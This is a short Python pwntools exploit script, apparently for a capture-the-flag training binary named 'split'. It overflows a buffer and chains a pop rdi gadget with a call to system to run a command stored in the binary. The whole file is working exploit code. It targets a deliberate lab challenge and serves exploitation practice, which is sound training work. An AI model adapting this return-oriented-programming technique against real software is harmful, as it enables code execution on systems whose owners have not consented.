#!/usr/bin/python3

from pwn import *



io = process('./split')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2


# This is the vaddr of system
# First return to the location of the pop rdi
pop_rdi = p64(0x004007c3)

addr_of_command = p64(0x00601060) 

call_system = p64(0x00400560)


back_junk = b"B" * 20


payload = junk + new_bp + pop_rdi  + addr_of_command +  call_system

payload += back_junk


print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

io.send(payload)



print(io.clean(0.5).decode("utf-8"))

input("exploit sent hit enter to end")

sleep(1)
